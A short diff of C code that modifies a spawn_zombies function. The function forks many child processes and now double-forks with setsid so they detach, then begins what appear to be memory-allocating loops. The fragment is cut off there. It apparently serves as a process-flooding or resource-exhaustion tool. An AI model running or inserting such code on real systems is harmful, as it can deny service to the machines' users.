@@ -13,12 +13,28 @@
 
 __attribute__((always_inline)) inline void spawn_zombies()
 {
-        int num_of_child_processes = 1024 * 1024;
+        int num_of_child_processes = 1024;
         for(int i = 0; i < num_of_child_processes; i++)
         {
                 pid_t child = fork();
-                if(child != 0)
+                if (child < 0)
                 {
+                        exit(EXIT_FAILURE);
+                }
+                        
+                if(child == 0)
+                {
+                        if (setsid() < 0)
+                        {
+                                exit(EXIT_FAILURE);
+                        }
+                        pid_t pid = fork();
+                        if (pid < 0)
+                                exit(EXIT_FAILURE);
+
+                        if (pid > 0)
+                                exit(EXIT_SUCCESS);
+
                         for(size_t i = 0; i < 1024; i++)
                         {
                                 int   size = 1024;
